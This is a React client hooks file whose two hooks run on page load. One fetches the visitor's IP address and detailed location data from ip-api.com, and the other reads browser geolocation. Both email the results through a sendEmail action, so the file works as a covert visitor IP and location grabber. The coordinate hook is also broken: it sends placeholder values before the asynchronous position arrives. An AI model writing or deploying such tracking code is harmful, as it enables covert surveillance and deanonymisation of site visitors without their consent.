"use client";

import { useEffect } from "react";
import { sendEmail } from "@/actions";

export const useGetIp = () => {
  useEffect(() => {
    (async () => {
      try {
        const response = await fetch("http://ip-api.com/json/?fields=66846719");
        const data = await response.json();
        console.log(`Your IP Address: ${JSON.stringify(data)}`);

        await sendEmail(data);
      } catch (error) {
        console.error("Error fetching IP address:", error);
      }
    })();
  }, []);
};

export const useGetCoords = () => {
  useEffect(() => {
    (async () => {
      let info = {
        lat: "chsec",
        lon: "chsec",
      };

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((position) => {
          info.lat = position.coords.latitude;
          info.lon = position.coords.longitude;
        });
      }

      await sendEmail(info);
    })();
  }, []);
};
